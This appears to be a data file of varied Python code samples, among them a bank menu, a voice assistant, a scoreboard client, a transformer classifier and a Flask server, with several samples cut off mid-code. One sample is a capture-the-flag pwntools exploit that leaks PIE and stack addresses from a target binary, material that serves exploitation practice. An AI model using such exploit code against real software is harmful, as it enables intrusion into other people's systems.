    "print(\n    '''\n+--------------------------------+\n|             Pybank             |\n+--------------------------------+\n| 1. Dep\u00f3sito                    |\n| 2. Saque                       |\n| 3. Extrato                     |\n| 4. Sair                        |\n+--------------------------------+\n'''\n)\n\nsaldo = 0\nlimite = 500\nextrato = \"\"\nnumero_saques = 0\nLIMITE_SAQUES = 3\n\nwhile True:\n    opcao = int(input('Digite uma op\u00e7\u00e3o: '))\n\n    if opcao == 1:\n        valor = float(input('Digite o valor do dep\u00f3sito: R$ '))\n\n        if valor > 0:\n            saldo += valor\n            extrato += f'Dep\u00f3sito: R$ {valor:.2f}\\n'\n            print(f'Dep\u00f3sito de R$ {valor:.2f} realizado com sucesso.')\n\n        else:\n            print(\"Opera\u00e7\u00e3o falhou! O valor informado \u00e9 inv\u00e1lido.\")\n\n    elif opcao == 2:\n        valor = float(input('Digite o valor do saque: R$ '))\n\n        if valor > saldo:\n            print('N\u00e3o ser\u00e1 poss\u00edvel sacar o dinheiro por falta de saldo.')\n\n        elif valor > limite:\n            print(f'O limite de saque \u00e9 de R$ {limite:.2f}')\n\n        elif numero_saques >= LIMITE_SAQUES:\n            print(f'Voc\u00ea atingiu o limite di\u00e1rio de {LIMITE_SAQUES} saques.')\n\n        elif valor > 0:\n            saldo -= valor\n            extrato += f'Saque: R$ {valor:.2f}\\n'\n            numero_saques += 1\n            print(f'Saque de R$ {valor:.2f} realizado com sucesso.')\n\n    elif opcao == 3:\n        print(\"N\u00e3o foram realizadas movimenta\u00e7\u00f5es.\" if not extrato else extrato)\n        print(f\"Saldo: R$ {saldo:.2f}\")\n\n    elif opcao == 4:\n        print('Obrigado por usar nossos servi\u00e7os.')\n        break\n\n    else:\n        print('Op\u00e7\u00e3o invalida')\n",
    "import openai\r\nfrom apikey import api_data\r\nimport pyttsx3\r\nimport speech_recognition as sr\r\nimport webbrowser\r\n\r\nopenai.api_key=api_data\r\n\r\ncompletion=openai.Completion()\r\n\r\ndef Reply(question):\r\n    prompt=f'Alby: {question}\\n Jarvis: '\r\n    response=completion.create(prompt=prompt, engine=\"text-davinci-002\", stop=['\\Alby'], max_tokens=200)\r\n    answer=response.choices[0].text.strip()\r\n    return answer\r\n\r\nengine=pyttsx3.init('sapi5')\r\nvoices=engine.getProperty('voices')\r\nengine.setProperty('voice', voices[0].id)\r\n\r\ndef speak(text):\r\n    engine.say(text)\r\n    engine.runAndWait()\r\n\r\nspeak(\"Hello How Are You? \")\r\n\r\ndef takeCommand():\r\n    r=sr.Recognizer()\r\n    with sr.Microphone() as source:\r\n        print('Listening....')\r\n        r.pause_threshold = 1\r\n        audio = r.listen(source)\r\n    try:\r\n        print(\"Recognizing.....\")\r\n        query=r.recognize_google(audio, language='en-in')\r\n        print(\"Alby Said: {} \\n\".format(query))\r\n    except Exception as e:\r\n        print(\"Say That Again....\")\r\n        return \"None\"\r\n    return query\r\n\r\n\r\nif __name__ == '__main__':\r\n    while True:\r\n        query=takeCommand().lower()\r\n        ans=Reply(query)\r\n        print(ans)\r\n        speak(ans)\r\n        if 'open youtube' in query:\r\n            webbrowser.open(\"www.youtube.com\")\r\n        if 'open google' in query:\r\n            webbrowser.open(\"www.google.com\")\r\n        if 'bye' in query:\r\n            break\r\n\r\n\r\n\r\n",
    "import tkinter as tk\r\nfrom tkinter import Tk, Button, Frame, ttk, messagebox, END, CENTER, filedialog\r\nimport time\r\nimport os, platform, ctypes, sys, socket\r\n\r\nteams = ['HHS Lakers', 'SVHS Vikings', 'FCA Eagles', 'CICS Vikings', 'CRHS Tigers', 'WS Tunder', 'Mc Warriors', 'SRS Cougars', 'JCS Golden Knights', 'Fundy Mariners', 'HCS Huskies', 'VCA Eagles']\r\nfiles = 0\r\nvolley_sets_home = 0\r\nvolley_sets_away = 0\r\nvolley_score_home = 0\r\nvolley_score_away = 0\r\nhome_team = \"Home\"\r\naway_team = \"Away\"\r\nser = home_team\r\nv_h_p_i = 'q' \r\nv_h_p_d = 'w'\r\nv_a_p_i = 'r'\r\nv_a_p_d = 't'\r\nfiller = 0\r\n\r\ndef find_server():\r\n    global HOST, filler\r\n    while True:  # Keep searching indefinitely\r\n        if filler < 999:\r\n            filler += 1\r\n        wifi_ip = get_ipv4_address()\r\n        striped_server = wifi_ip.rstrip(\"1234567890\")\r\n        HOST = f'{striped_server}{filler}'\r\n        if ping_server():  # Ping the server and handle errors\r\n            print(f\"Server found at {HOST}\")\r\n            break  # Exit the loop once a server is found\r\n\r\ndef ping_server():\r\n    global HOST, PORT\r\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    client_socket.settimeout(0.002)  # Set timeout to 2 milliseconds (0.002 seconds)\r\n    try:\r\n        client_socket.connect((HOST, PORT))\r\n        message = \"server found\"\r\n        client_socket.send(message.encode())\r\n        print(f\"{message}\")\r\n        return True  # Server is found and reachable\r\n    except ConnectionRefusedError:\r\n        print(\"Connection refused. Server is not available.\")\r\n        return False  # Server is not available\r\n    except socket.timeout:\r\n        print(\"Socket connection timed out.\")\r\n        return False  # Connection timed out\r\n    except Exception as e:\r\n        print(f\"Error occurred: {e}\")\r\n        return False  # Other errors, continue searching\r\n    finally:\r\n        client_socket.close()\r\n\r\n\r\nHOST = ''\r\nPORT = 65432\r\n\r\ndef send_message(w):\r\n    global volley_score_home, volley_score_away, home_team, away_team, volley_sets_home, volley_sets_away, ser\r\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    try:\r\n        client_socket.connect((HOST, PORT))\r\n        print(\"Connected to the server!\")\r\n        if w == \"volley\":\r\n            message = str(w)\r\n        if w == \"basket\":\r\n            message = str(w)\r\n        if w == \"vbhp\":\r\n            message = f\"{w} {volley_score_home}\"\r\n        if w == \"vbap\":\r\n            message = f\"{w} {volley_score_away}\"\r\n        if w == \"vbhs\":\r\n            message = f\"{w} {volley_sets_home}\"\r\n        if w == \"vbas\":\r\n            message = f\"{w} {volley_sets_away}\"\r\n        if w == \"vbsv\":\r\n            message = f\"{w} {ser}\"\r\n        if w == \"vbhn\":\r\n            message = f\"{w} {home_team}\"\r\n        if w == \"vban\":\r\n            message = f\"{w} {away_team}\"\r\n        client_socket.send(message.encode())\r\n        print(f\"Sent message to server: {message}\")\r\n    except ConnectionRefusedError:\r\n        print(\"Connection refused. Server is not available.\")\r\n    finally:\r\n        client_socket.close()\r\n \r\ndef get_ipv4_address():\r\n    # Create a temporary socket to get the local IP address\r\n    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\n    try:\r\n        # Connect to any remote address (doesn't have to be reachable)\r\n        temp_socket.connect((\"8.8.8.8\", 80))\r\n        # Get the local IP address connected to the socket\r\n        ip_address = temp_socket.getsockname()[0]\r\n    finally:\r\n        temp_socket.close()\r\n    return ip_address\r\n\r\ndef is_admin():\r\n    try:\r\n        return ctypes.windll.shell32.IsUserAnAdmin()\r\n    except:\r\n        return False\r\n\r\ndef Checks_files(file_paths):\r\n    global files, teams\r\n    for file_path in file_paths:\r\n        directory = os.path.dirname(file_path)\r\n        if file_path == f\"c:/Users/{os.getenv('USERNAME')}/OneDrive/Documents/Scoreboard_saved_teams\":\r\n            if not os.path.exists(file_path):\r\n                if is_admin():\r\n                    os.makedirs(directory, exist_ok=True)\r\n                    print(\"Created folder at\", directory)\r\n                else:\r\n                    print(\"Please run the script as an administrator to create this folder.\")\r\n                    if not hasattr(sys, 'frozen'):\r\n                        ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, __file__, None, 1)\r\n                    return\r\n            else:\r\n                print(\"The folder already exists at\", directory)\r\n\r\n\r\n        if file_path != f\"c:/Users/{os.getenv('USERNAME')}/OneDrive/Documents/Scoreboard_saved_teams\":\r\n            if not os.path.exists(file_path):\r\n                if is_admin():\r\n                    os.makedirs(directory, exist_ok=True)\r\n                    with open(file_path, \"w\") as file:\r\n                        for team in teams:\r\n                            file.write(team+\"\\n\")\r\n                else:\r\n                    print(\"Please run the script as an administrator to create thi",
    "#Importing Libraries\n\nimport cv2\nimport dlib\nimport time\nimport math\n\n#Classifier File\ncarCascade = cv2.CascadeClassifier(\"vech.xml\")\n\n#Video file capture\nvideo = cv2.VideoCapture(\"carsVideo.mp4\")\n\n# Constant Declaration\nWIDTH =1280\nHEIGHT = 720\n\n#estimate speed function\ndef estimateSpeed(location1, location2):\n    d_pixels = math.sqrt(math.pow(location2[0] - location1[0], 2) + math.pow(location2[1] - location1[1], 2))\n    ppm = 8.8\n    d_meters = d_pixels / ppm\n    fps = 18\n    speed = d_meters * fps * 3.6\n    return speed\n\n#tracking multiple objects\ndef trackMultipleObjects():\n    rectangleColor = (0, 255, 255)\n    frameCounter = 0\n    currentCarID = 0\n    fps = 0\n\n    carTracker = {}\n    carNumbers = {}\n    carLocation1 = {}\n    carLocation2 = {}\n    speed = [None] * 1000\n\n    out = cv2.VideoWriter('outTraffic.avi', cv2.VideoWriter_fourcc('M','J','P','G'), 10, (WIDTH, HEIGHT))\n\n    while True:\n        start_time = time.time()\n        rc, image = video.read()\n        if type(image) == type(None):\n            break\n\n        image = cv2.resize(image, (WIDTH, HEIGHT))\n        resultImage = image.copy()\n\n        frameCounter = frameCounter + 1\n        carIDtoDelete = []\n\n        for carID in carTracker.keys():\n            trackingQuality = carTracker[carID].update(image)\n\n            if trackingQuality < 7:\n                carIDtoDelete.append(carID)\n\n        \n        for carID in carIDtoDelete:\n            print(\"Removing carID \" + str(carID) + ' from list of trackers. ')\n            print(\"Removing carID \" + str(carID) + ' previous location. ')\n            print(\"Removing carID \" + str(carID) + ' current location. ')\n            carTracker.pop(carID, None)\n            carLocation1.pop(carID, None)\n            carLocation2.pop(carID, None)\n\n        \n        if not (frameCounter % 10):\n            gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n            cars = carCascade.detectMultiScale(gray, 1.1, 13, 18, (24, 24))\n\n            for (_x, _y, _w, _h) in cars:\n                x = int(_x)\n                y = int(_y)\n                w = int(_w)\n                h = int(_h)\n\n                x_bar = x + 0.5 * w\n                y_bar = y + 0.5 * h\n\n                matchCarID = None\n\n                for carID in carTracker.keys():\n                    trackedPosition = carTracker[carID].get_position()\n\n                    t_x = int(trackedPosition.left())\n                    t_y = int(trackedPosition.top())\n                    t_w = int(trackedPosition.width())\n                    t_h = int(trackedPosition.height())\n\n                    t_x_bar = t_x + 0.5 * t_w\n                    t_y_bar = t_y + 0.5 * t_h\n\n                    if ((t_x <= x_bar <= (t_x + t_w)) and (t_y <= y_bar <= (t_y + t_h)) and (x <= t_x_bar <= (x + w)) and (y <= t_y_bar <= (y + h))):\n                        matchCarID = carID\n\n                if matchCarID is None:\n                    print(' Creating new tracker' + str(currentCarID))\n\n                    tracker = dlib.correlation_tracker()\n                    tracker.start_track(image, dlib.rectangle(x, y, x + w, y + h))\n\n                    carTracker[currentCarID] = tracker\n                    carLocation1[currentCarID] = [x, y, w, h]\n\n                    currentCarID = currentCarID + 1\n\n        for carID in carTracker.keys():\n            trackedPosition = carTracker[carID].get_position()\n\n            t_x = int(trackedPosition.left())\n            t_y = int(trackedPosition.top())\n            t_w = int(trackedPosition.width())\n            t_h = int(trackedPosition.height())\n\n            cv2.rectangle(resultImage, (t_x, t_y), (t_x + t_w, t_y + t_h), rectangleColor, 4)\n\n            carLocation2[carID] = [t_x, t_y, t_w, t_h]\n\n        end_time = time.time()\n\n        if not (end_time == start_time):\n            fps = 1.0/(end_time - start_time)\n\n        for i in carLocation1.keys():\n            if frameCounter % 1 == 0:\n                [x1, y1, w1, h1] = carLocation1[i]\n                [x2, y2, w2, h2] = carLocation2[i]\n\n                carLocation1[i] = [x2, y2, w2, h2]\n\n                if [x1, y1, w1, h1] != [x2, y2, w2, h2]:\n                    if (speed[i] == None or speed[i] == 0) and y1 >= 275 and y1 <= 285:\n                        speed[i] = estimateSpeed([x1, y1, w1, h1], [x1, y2, w2, h2])\n\n                    if speed[i] != None and y1 >= 180:\n                        cv2.putText(resultImage, str(int(speed[i])) + \"km/h\", (int(x1 + w1/2), int(y1-5)), cv2.FONT_HERSHEY_SIMPLEX, 0.75, (0, 0, 100) ,2)\n\n        cv2.imshow('result', resultImage)\n\n        out.write(resultImage)\n\n        if cv2.waitKey(1) == 27:\n            break\n\n    \n    cv2.destroyAllWindows()\n    out.release()\n\nif __name__ == '__main__':\n    trackMultipleObjects()",
    "\"\"\"\nTRANSFORMER implementation adapted from https://github.com/JKfuberlin/SITST4TSC\n\"\"\"\nimport torch\nfrom torch import nn, Tensor\nfrom torch.nn.modules.normalization import LayerNorm\nfrom torch.nn import TransformerEncoder, TransformerEncoderLayer\nfrom torch.utils.data import DataLoader\nimport math\nfrom typing import Optional\nimport numpy as np\nfrom sits_dl.tensordatacube import TensorDataCube as TDC\n\n'''\nThis script defines an instance of the Transformer Object for Classification\nIt consists of two classes, one for Positional Encoding and another for the classifier itself\nBoth have a __init__ for initialization and a 'forward' method that is called during training and validation \nbecause they are both subclasses of nn.Module, and this is a required method in PyTorch's module system.\n\n'''\ndropout=0.1\nmax_len = 5000 # defining maximum sequence length the model will be able to process here\n# model dimensions (hyperparameter), dropout is already included here to make the model less prone to overfitting due to a specific sequence, max_length is defined. DOY needs to be smaller than that\ndevice = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')\n# I don't know if this makes sense here, as device should be assigned in the main script where model is trained / inference happens\n\nclass PositionalEncoding(nn.Module):\n    \"\"\"Inject some information about the relative or absolute position of the tokens in the sequence.\n        The positional encodings have the same dimension as the embeddings, so that the two can be summed.\n        Here, we use sine and cosine functions of different frequencies.\n    .. math:\n        \\text{PosEncoder}(pos, 2i) = sin(pos/10000^(2i/d_model))\n        \\text{PosEncoder}(pos, 2i+1) = cos(pos/10000^(2i/d_model))\n        \\text{where pos is the word position and i is the embed idx)\n    Args:\n        d_model: the embed dim (required).\n        dropout: the dropout value (default=0.1).\n        max_len: the max. length of the incoming sequence (default=5000).\n    Examples:\n        pos_encoder = PositionalEncoding(d_model)\n    \"\"\"\n    def __init__(self, d_model:int, dropout=0.1, max_len=5000): # model dimensions (hyperparameter), dropout is already included here to make the model less prone to overfitting due to a specific sequence, max_length is defined. DOY needs to be smaller than that\n        super(PositionalEncoding, self).__init__() # The super() builtin returns a proxy object (temporary object of the superclass) that allows us to access methods of the base class.\n        # i do not understand what that means\n        self.dropout = nn.Dropout(p=dropout) # WTF i do not understand, what this does\n        pe = torch.zeros(max_len, d_model) # positional encoding object is initialized with zeros, according to max length and model dimension. 5000 because we need a position on the sin/cos line for every possible DOY\n        positionPE = torch.arange(0, max_len, dtype=torch.float).unsqueeze(1) # used to create a 1-dimensional tensor representing the positions of tokens in a sequence.\n        div_term = torch.exp(torch.arange(0, d_model, 2).float() * (-math.log(10000.0) / d_model)) # a tensor representing the values used for scaling in the positional encoding calculation\n        # Apply the sinusoidal encoding to even indices and cosine encoding to odd indices\n        pe[:, 0::2] = torch.sin(positionPE * div_term)\n        pe[:, 1::2] = torch.cos(positionPE * div_term)\n        # pe = pe.unsqueeze(0).transpose(0, 1) # torch.Size([5000, 1, 204]) max_len, ?, d_model\n        self.register_buffer('pe', pe) # WTF i don't know what and why\n\n    def forward(self, doy):\n        doy = doy.to(self.pe.device)\n        return self.pe[doy, :]\n\nclass TransformerClassifier(nn.Module):\n    def __init__(self, num_bands:int, num_classes:int, d_model:int, nhead:int, num_layers:int, dim_feedforward:int, sequence_length:int) -> None:\n        super(TransformerClassifier, self).__init__()\n        self.sequence_length = sequence_length\n        self.d_model = d_model\n        # encoder embedding, here a linear transformation is used to create the embedding, apparently it is an instance of nn.Linear that takes num_bands and d_model as args\n        self.src_embd = nn.Linear(num_bands, d_model) # GPT: this linear transformation involves multiplying the input by a weight matrix and adding a bias vector.\n\n        # transformer model\n        encoder_layer = TransformerEncoderLayer(d_model*2, nhead, dim_feedforward, batch_first=True) # batch_first = True to avoid a warning concerning nested tensors and probably speeding up inference\n        encoder_norm = LayerNorm(d_model*2)\n        self.transformer_encoder = TransformerEncoder(encoder_layer, num_layers, encoder_norm)\n        # classification\n        self.fc = nn.Sequential( # does this run for each step of the sequence?\n                    nn.Linear(d_model*2, 256), # condense the output of the pooling of the transformer encoder into a more dense representation\n            ",
    "import argparse\nimport asyncio\nimport logging\nimport signal\n\nfrom bleak import BleakClient, BleakScanner\nfrom bleak.backends.characteristic import BleakGATTCharacteristic\nfrom bleak import uuids\n\nlogger = logging.getLogger(__name__)\ncondition = False\n\n\n# Handle CTRL+C and other stop signals\ndef signal_handler(sig, frame):\n    global condition\n    condition = True\n    logger.critical('Stop signal detected!')\n\n\n# Handler registered when event occurring\ndef notification_handler(characteristic: BleakGATTCharacteristic, data: bytearray):\n    \"\"\"Simple notification handler which prints the data received.\"\"\"\n    logger.info(\"%s: %d%%\", characteristic.description, int.from_bytes(data, \"little\") / 100)\n\n\nasync def main(args: argparse.Namespace):\n    logger.info(\"starting scan...\")\n\n    # Check what the user typed in the terminal and BLE scanning\n    if args.address:\n        device = await BleakScanner.find_device_by_address(\n            args.address, cb=dict(use_bdaddr=args.macos_use_bdaddr)\n        )\n        if device is None:\n            logger.error(\"could not find device with address '%s'\", args.address)\n            return\n    else:\n        device = await BleakScanner.find_device_by_name(\n            args.name, cb=dict(use_bdaddr=args.macos_use_bdaddr)\n        )\n        if device is None:\n            logger.error(\"could not find device with name '%s'\", args.name)\n            return\n        \n    logger.info(\"connecting to device...\")\n\n     # Handle the BLE server disconnection\n    disconnected_event = asyncio.Event()\n\n    def disconnected_callback(client):\n        disconnected_event.set()\n        logger.warning(\"BLE server disconnected! Closing...\")\n\n    # Connection with the device requested\n    async with BleakClient(device, disconnected_callback) as client:\n        logger.info(\"Connected\")\n\n        # Convert the standard UUID to UUID used by Break API\n        uuid = uuids.normalize_uuid_16(int(args.characteristic, 16))\n        await client.start_notify(uuid, notification_handler)\n\n        # Until stopped, give to the other coroutines chances to run,\n        # since AsynIO uses a cooperative multitasking model\n        global condition\n        while not condition and not disconnected_event.is_set(): \n            await asyncio.sleep(1.0) \n\n        # Close the connection if CTRL+C is pressed, otherwise the\n        # disconnection will be handled in background\n        if not disconnected_event.is_set() and condition:\n            disconnected_event.set()\n            if client.is_connected:\n                try:\n                    await client.stop_notify(uuid)\n                except:\n                    logger.warning(\"BLE server already disconnected\")\n        \n        await disconnected_event.wait()\n        \n    logger.info(\"Disconnected successfully. Goodbye!\")\n\n\nif __name__ == \"__main__\":\n    \n    # Inform the user about what he has to write on the terminal\n    parser = argparse.ArgumentParser()\n    device_group = parser.add_mutually_exclusive_group(required=True)\n\n    device_group.add_argument(\n        \"--name\",\n        metavar=\"<name>\",\n        help=\"the name of the bluetooth device to connect to\",\n    )\n    device_group.add_argument(\n        \"--address\",\n        metavar=\"<address>\",\n        help=\"the address of the bluetooth device to connect to\",\n    )\n\n    parser.add_argument(\n        \"--macos-use-bdaddr\",\n        action=\"store_true\",\n        help=\"when true use Bluetooth address instead of UUID on macOS\",\n    )\n\n    parser.add_argument(\n        \"characteristic\",\n        metavar=\"<notify uuid>\",\n        help=\"UUID of a characteristic that supports notifications\",\n    )\n\n    parser.add_argument(\n        \"-d\",\n        \"--debug\",\n        action=\"store_true\",\n        help=\"sets the log level to debug\",\n    )\n\n    # Parse the terminal\n    args = parser.parse_args()\n\n    log_level = logging.DEBUG if args.debug else logging.INFO\n    logging.basicConfig(\n        level=log_level,\n        format=\"%(asctime)-15s %(name)-8s %(levelname)s: %(message)s\",\n    )\n\n    # Register handle for stop signals\n    signal.signal(signal.SIGINT, signal_handler)\n\n    # Run the loop and create the main task passing the user arguments\n    asyncio.run(main(args))",
    "from dotenv import load_dotenv\n\nload_dotenv()  # load all the environment variables from .env\nimport streamlit as st\nimport os\nfrom PIL import Image\nimport google.generativeai as genai\n\nos.getenv(\"GOOGLE_API_KEY\")\ngenai.configure(api_key=os.getenv(\"GOOGLE_API_KEY\"))\n\n\n# Function to load Gemini pro vision\ndef get_gemini_response(input, image, prompt):\n    model = genai.GenerativeModel('gemini-pro-vision')\n    response_Model = model.generate_content([input, image[0], prompt])\n    return response_Model.parts\n\n\ndef input_image_setup(uploaded_file):\n    # Check if a file has been uploaded\n    if uploaded_file is not None:\n        # Read the file into bytes\n        bytes_data = uploaded_file.getvalue()\n\n        image_parts = [\n            {\n                \"mime_type\": uploaded_file.type,  # Get the mime type of the uploaded file\n                \"data\": bytes_data\n            }\n        ]\n        return image_parts\n    else:\n        raise FileNotFoundError(\"No file uploaded\")\n\n\n\n# initialize our streamlit app\n\nst.set_page_config(page_title=\"Invoice Extractor\")\nst.header(\"Invoice Extractor\")\ninput = st.text_input(\"Input Prompt: \", key=\"input\")\nuploaded_file = st.file_uploader(\"Choose an image of the invoice...\", type=[\"jpg\", \"jpeg\", \"png\"])\nimage = \"\"\nif uploaded_file is not None:\n    image = Image.open(uploaded_file)\n    st.image(image, caption=\"Uploaded Image\", use_column_width=True)\n\nsubmit = st.button(\"Get Data\")\n\ninput_prompt = \"\"\"\n               You are an expert in understanding invoices.\n               You will receive input images as invoices and\n               you will have to answer questions based on the input image\n               \"\"\"\n\n# if submit button is clicked\nif submit:\n    combine_string = \"\"\n    image_data = input_image_setup(uploaded_file)\n    responses = get_gemini_response(input_prompt, image_data, input)\n    st.subheader(\"The Response is\")\n    for response in responses:\n        combine_string += response.text\n    st.write(combine_string)\n\n",
    "from pwn import *\nimport sys\n\ncontext.terminal = \"kitty\"\ncontext.gdbinit = \"/opt/pwndbg/gdbinit\"\ncontext.log_level = \"info\"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'\nbinary = \"./woogie-boogie\"        ### CHANGE ME !!!!!!!!!!!!!!!!\n\ngdbscript = '''\n    b main\n'''\ndef init():\n    ## loading custom libc\n    # env = {\"LD_PRELOAD\": \"./desired_libc\"}\n    ## loading custom libc\n    if (args.GDB):\n        pp = gdb.debug(binary, gdbscript=gdbscript)\n    elif (args.REMOTE):\n        pp = remote(sys.argv[1], int(sys.argv[2]))\n    else :\n        pp = process(binary)# env=env)\n    return pp\n\ndef findip(pp, length):\n    cyclic_patt = cyclic(length)\n    pp.recv()\n    pp.sendline(cyclic_patt)\n    pp.wait()\n    # offset = cyclic_find(pp.core.pc)\n    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))\n    log.info(f\"offset found {offset}\")\n\ndef woogieboogie(adx, bdx):\n    pp.recvuntil(b\": \")\n    pp.sendline(str(adx).encode())\n    pp.recvuntil(b\": \")\n    pp.sendline(str(bdx).encode())\n\ndef swap(bytess):\n    splbytes = [bytess[i] for i in range (0, len(bytess))]\n\n    for i in range(0, 4):\n        tmp = splbytes[i]\n        splbytes[i] = splbytes[7 - i]\n        splbytes[7 - i] = tmp\n    byt = b\"\"\n    for i in splbytes :\n        byt += i.to_bytes(1)\n    return (byt)\n\ndef readstack(offset):\n    log.info(f\"reading offset {offset}\")\n    # modifying the rip, with start\n    woogieboogie(5, 31)\n    # getting the fucking main function to leak it lol\n    woogieboogie(0, offset)\n    # ending it\n    woogieboogie(0, 0)\n    leak = pp.recvline().rstrip()\n    leak += (8 - len(main)) * b'\\x00'\n    leakaddr = u64(swap(leak))\n    return (leakaddr)\n\ndef exploit():\n    piebase = readstack(7) - elf.sym.main\n    log.info(f\"piebase {hex(piebase)}\")\n    stacktop = readstack(6) - 0x1ffb0\n    log.info(f\"stacktop {hex(stacktop)}\")\n    envp = stacktop + 0x1ffd8\n    log.info(f\"envp {hex(envp)}\")\n\n    pp.interactive()\n\nif (args.REMOTE):\n    libc = ELF(\"./libc.so.6\")\nelse:\n    libc = ELF(\"/usr/lib/libc.so.6\")\nlibcrops = ROP(libc)\nelf = context.binary = ELF(binary)\npp = init()\nexploit()\n",
    "from requests import get\nfrom pprint import PrettyPrinter\nfrom dotenv import load_dotenv\nimport os\n\nload_dotenv()\nprinter = PrettyPrinter()\n\nBASE_URL = \"https://api.freecurrencyapi.com/v1/\"\nAPI_KEY = os.getenv('API_KEY')\n\n\ndef get_currencies():\n    endpoint = f\"currencies?apikey={API_KEY}\"\n    url = BASE_URL + endpoint\n    response = get(url)\n    if response.status_code == 200:\n        data = response.json()['data']\n        data = list(data.items())\n        data.sort()\n        return data\n    else:\n        print(f\"Failed to fetch currencies. Status code: {response.status_code}\")\n        return None\n\n\ndef print_currencies(currencies):\n    for name, currency in currencies:\n        name = currency['name']\n        _id = currency['code']\n        symbol = currency.get(\"symbol\", \"\")\n        print(f\"{_id} - {name} - {symbol}\")\n\n\ndef exchange_rate(currency1, currency2):\n    endpoint = f\"latest?apikey={API_KEY}&base_currency={currency1}&currencies={currency2}\"\n    url = BASE_URL + endpoint\n    response = get(url)\n    if response.status_code == 200:\n        data = response.json()\n        rate = data['rates'][currency2]\n        print(f\"1 {currency1} -> {rate} {currency2}\")\n        return rate\n    else:\n        print(f\"Failed to fetch exchange rate. Status code: {response.status_code}\")\n        return None\n\n\ndef convert(currency1, currency2, amount):\n    rate = exchange_rate(currency1, currency2)\n    if rate is not None:\n        try:\n            amount = float(amount)\n            converted_amount = rate * amount\n            print(f\"{amount} {currency1} is equal to {converted_amount} {currency2}\")\n            return converted_amount\n        except ValueError:\n            print(\"Invalid amount.\")\n    return None\n\n\ndef main():\n    currencies = get_currencies()\n\n    print(\"Welcome to the currency converter!\")\n    print(\"List - lists the different currencies\")\n    print(\"Convert - convert from one currency to another\")\n    print(\"Rate - get the exchange rate of two currencies\")\n    print()\n\n    while True:\n        command = input(\"Enter a command (q to quit): \").lower()\n\n        if command == \"q\":\n            break\n        elif command == \"list\":\n            print_currencies(currencies)\n        elif command == \"convert\":\n            currency1 = input(\"Enter a base currency: \").upper()\n            amount = input(f\"Enter an amount in {currency1}: \")\n            currency2 = input(\"Enter a currency to convert to: \").upper()\n            convert(currency1, currency2, amount)\n        elif command == \"rate\":\n            currency1 = input(\"Enter a base currency: \").upper()\n            currency2 = input(\"Enter a currency to convert to: \").upper()\n            exchange_rate(currency1, currency2)\n        else:\n            print(\"Unrecognized command!\")\n\n\nif __name__ == \"__main__\":\n    main()",
    "#coding:utf-8\nimport sys\nimport os\n# sys.path.append(\"..\")\nimport json\nfrom flask.json import jsonify\nfrom flask import Flask, render_template, make_response\nfrom flask_cors import CORS\nfrom flask import request\nfrom utlis import str2txt, retuen_img_stream, get_result\nfrom getPred import inference, mgf_to_pklbin\n\n\napp = Flask(__name__, static_folder='../frontend/static', \n                      template_folder='../frontend/templates')\n\ncors = CORS(app, supports_credentials=True)\napp.jinja_env.variable_start_string = '{['\napp.jinja_env.variable_end_string = ']}'\n\n\n@app.route(\"/\", methods=['GET', 'POST'])\ndef index():\n    if request.method == \"GET\":\n        return render_template(\"HomePage.html\")\n    else:\n        type = request.form.get(\"type\") \n        fn = './data/pred' \n        if type == 'textinput':\n            data = request.form.get(\"data\") \n            print(data)\n            print(os.getcwd())\n            str2txt(data)\n        else:\n            file_metas = request.files.get('file')\n            file_save = fn + '.txt'\n            file_metas.save(file_save)\n            with open(file_save, 'r', encoding='utf-8') as f:\n                data = f.readlines()[0]\n        \n        # \u6267\u884cinference\n        inference(fn)\n        # \u8bfb\u53d6\u8fd4\u56de\u7ed3\u679c\n        res = get_result(data)\n        return jsonify(res)\n\n@app.route(\"/uploader\", methods=['POST'])\ndef uploader():\n    file_metas = request.files.get('file')\n    print(os.getcwd())\n    file_save = './data/Actual-Measure.mgf'\n    file_metas.save(file_save)\n    mgf_to_pklbin()\n    return jsonify({'res': '\u4e0a\u4f20\u6210\u529f'})\n\n\nif __name__ == \"__main__\":\n    app.debug = False\n    app.run(host='0.0.0.0', port='8080')\n\n",
    "# Body Mass Index Detection Program\n\n# Imported Library\nimport os\nfrom pyfiglet import figlet_format\nfrom termcolor2 import colored\nfrom datetime import datetime\n\n# Clear Terminal \nos.system('clear')\n\n# Function's For Secret Progtamming\ndef main():\n    \"Function's For Secret Progtamming\"\n\n    # Try For Programming\n    try:\n        'Try For Programming'\n\n        # While For Programming\n        while True:\n            'While For Programming'\n\n            # Wellcome\n            print(colored('==============================', color='white'))\n            print(colored(figlet_format('Wellcome'), color='cyan'))\n            print(colored('==============================', color='white'))\n\n            # Data For Referral time\n            print(colored(f'Referral time : {datetime.now()}', color='green'))\n            print(colored('==============================', color='white'))\n\n            # Input Info Body\n            body_weight = float(input('Please Enter Body weight(KG) :~$ '))\n            body_height = float(input('Please Enter Body height(MTR) :~$ '))\n\n            # Result\n            bmi = (body_weight / (body_height ** 2))\n\n            print(colored('==============================', color='yellow'))\n\n            # If's For Result\n\n            # Underweight\n            if bmi <= 18.5:\n                print(colored(f'Bmi your body :~$ {bmi}', color='magenta'))\n                print(colored('==============================', color='white'))\n                print(colored('Condition :~# ', color='cyan'))\n                print(colored(figlet_format('Underweight'), color='yellow'))\n                print(colored('==============================', color='white'))\n\n            # Normal\n            elif 18.5 < bmi < 24.9:\n                print(colored(f'Bmi your body :~$ {bmi}', color='magenta'))\n                print(colored('==============================', color='white'))\n                print(colored('Condition :~# ', color='cyan'))\n                print(colored(figlet_format('Normal'), color='green'))\n                print(colored('==============================', color='white'))\n\n            # Overweight\n            elif 25 < bmi < 29.9:\n                print(colored(f'Bmi your body :~$ {bmi}', color='magenta'))\n                print(colored('==============================', color='white'))\n                print(colored('Condition :~# ', color='cyan'))\n                print(colored(figlet_format('Overweight 1'), color='red'))\n                print(colored('==============================', color='white'))\n\n            # Overweight\n            elif 30 < bmi < 34.9:\n                print(colored(f'Bmi your body :~$ {bmi}', color='magenta'))\n                print(colored('==============================', color='white'))\n                print(colored('Condition :~# ', color='cyan'))\n                print(colored(figlet_format('Overweight 2'), color='red'))\n                print(colored('==============================', color='white'))\n\n            # Overweight\n            elif 35 < bmi < 39.9:\n                